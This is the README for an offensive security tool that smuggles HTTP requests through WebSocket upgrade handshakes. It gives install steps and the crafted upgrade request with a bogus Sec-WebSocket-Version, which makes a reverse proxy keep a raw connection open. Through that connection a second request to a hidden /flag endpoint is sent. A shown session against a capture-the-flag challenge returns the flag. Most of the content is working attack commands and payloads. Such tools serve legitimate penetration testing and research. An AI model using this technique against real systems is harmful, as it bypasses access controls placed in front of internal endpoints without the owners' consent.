# websocket-connection-smuggler
## Dependency
```cassandraql
$ go get -u github.com/c-bata/go-prompt
```

## Install 
```cassandraql
$ go get github.com/hahwul/websocket-connection-smuggler
```

or 

```cassandraql
$ git clone https://github.com/hahwul/websocket-connection-smuggler
$ cd websocket-connection-smuggler
$ go build
$ ./websocket-connection-smuggler
```

## Usage
### 1. run wcs(websocket-connection-smuggler)
```cassandraql
$ websocket-connection-smuggler
```

### 2. set target address(domain or ip address)
```cassandraql
$ WCS(...) > set target {your target}
```

### 3. is SSL? (default is false)
```cassandraql
# HTTPS
$ WCS(...) > set ssl true

# HTTP
$ WCS(...) > set ssl false
```

### 4. set original request(o_data)

It used the default editor defined in the environment variables, such as vim and no. If you don't have any special settings, vim is the default.
```cassandraql
$ WCS(...) > set o_data
```

e.g
```cassandraql
GET /socket.io/?transport-websocket HTTP/1.1
Host: localhost:80
Sec-WebSocket-Version: 4444
Upgrade: websocket

```

### 5. set smuggling reqeust(s_data)

It used the default editor defined in the environment variables, such as vim and no. If you don't have any special settings, vim is the default.
```cassandraql
$ WCS(...) > set s_data
```

e.g
```cassandraql
GET /flag HTTP/1.1 
Host: localhost:5000

```

## Test to 0ang3el Websocket Smuggling Challenge
```

             ___          
            /   \\        
       /\\ | . . \\       
     ////\\|     ||       
   ////   \\ ___//\       
  ///      \\      \      
 ///       |\\      |     
//         | \\  \   \    
/          |  \\  \   \   
           |   \\ /   /   
           |    \/   /    
            ---------
     WebSocket Connection Smuggler
     by @hahwul

WCS(target=>None | ssl=>false ) > set target challenge.0ang3el.tk:80
WCS(target=>challenge.0ang3el.tk:80 | ssl=>false ) > set o_data
WCS(target=>challenge.0ang3el.tk:80 | ssl=>false ) > set s_data
WCS(target=>challenge.0ang3el.tk:80 | ssl=>false ) > send
GET /socket.io/?transport-websocket HTTP/1.1
Host: localhost:80
Sec-WebSocket-Version: 4444
Upgrade: websocket

2019/11/30 03:39:15 HTTP/1.1 200 OK
Content-Type: application/json
Content-Length: 49
Date: Fri, 29 Nov 2019 18:39:15 GMT

{"flag": "In 50VI37 rUS5I4 vODK@ DRiNKs YOu!!!"}
gth: 119
Date: Fri, 29 Nov 2019 18:39:14 GMT

        �0{"pingInterval":25000,"pingTimeout":60000,"upgrades":["websocket"],"sid":"5148720e07f240a99e6aa7457f41686f"}�40
```

## Video on asciinema
[![asciicast](https://asciinema.org/a/vSYXtlQtvh7yBh0uBES9r5BMV.svg)](https://asciinema.org/a/vSYXtlQtvh7yBh0uBES9r5BMV)

## Reference
- https://speakerdeck.com/0ang3el/whats-wrong-with-websocket-apis-unveiling-vulnerabilities-in-websocket-apis
- https://www.hahwul.com/2019/10/websocket-connection-smuggling.html
- https://github.com/hahwul/websocket-connection-smuggling-go